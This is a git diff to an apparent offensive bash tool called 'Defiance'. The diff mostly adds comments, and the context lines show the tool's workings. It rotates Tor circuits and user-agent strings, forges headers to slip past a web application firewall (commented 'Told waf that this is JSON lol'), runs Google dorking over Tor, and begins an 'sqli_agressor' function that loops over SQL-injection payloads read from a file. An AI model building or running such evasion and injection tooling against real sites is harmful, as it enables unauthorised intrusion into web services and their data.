@@ -8,7 +8,7 @@ export DEFIANCE_DIR="$(cd "$(dirname "${BASH_SOURCE}")" && pwd)"
 export ROOT_LOG_FILE="$DEFIANCE_DIR/../targetDef.log"
 
 source "$DEFIANCE_DIR/../tamper/hungry.sh"
-
+# Killing all process related to this thing, since there's 2 vector. No no manual CTRL C.
 eexit() {
     trap - SIGINT SIGTERM EXIT
     echo -e "\n\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Interrupted, process killed. "
@@ -21,7 +21,7 @@ if [ -n "$custom_proxy" ]; then
 else
     export TOR_CIRCUITS=(9050 9052 9054 9056 9058 9060)
 fi
-
+# Random agent Array here.
 export DEFIANCE_UA=(
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
@@ -30,7 +30,7 @@ export DEFIANCE_UA=(
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/605.1.15"
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
 )
-
+# logo
 print_defiance_logo() {
     echo -e "                \e[38;5;18m▄\e[0m"
     echo -e "              \e[38;5;18m▄██\e[0m"
@@ -55,6 +55,8 @@ print_defiance_logo() {
         echo -e "\e[0;31m[\e[0m!\e[0;37m]\e[0m MultiCircuit Rotation Enabled. IPs are shifting dynamically per request.!"
     fi
 }
+# HTTP pollution, air pollution.
+# Told waf that this is JSON lol.
 braindamage() {
     local choice=$((RANDOM % 3))
     local cf_ray=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 16 | head -n 1)
@@ -73,10 +75,10 @@ braindamage() {
         esac
     fi
 }
-
+# dork, goofle dorking. I mean google.
 dork() {
     local dom="$1"
-    echo -e "\e[0;34m[*]\e[0m Launching Universal Google Dorking..."
+    echo -e "[i] Launching Universal Google Dorking..."
     sleep 2
 
     local gerbang=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
@@ -116,6 +118,7 @@ dork() {
         return 2
     fi
 }
+# 1st Vector func.
 vector_sqli_agressor_left() {
     while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
         [[ -z "$default_path" ]] && continue
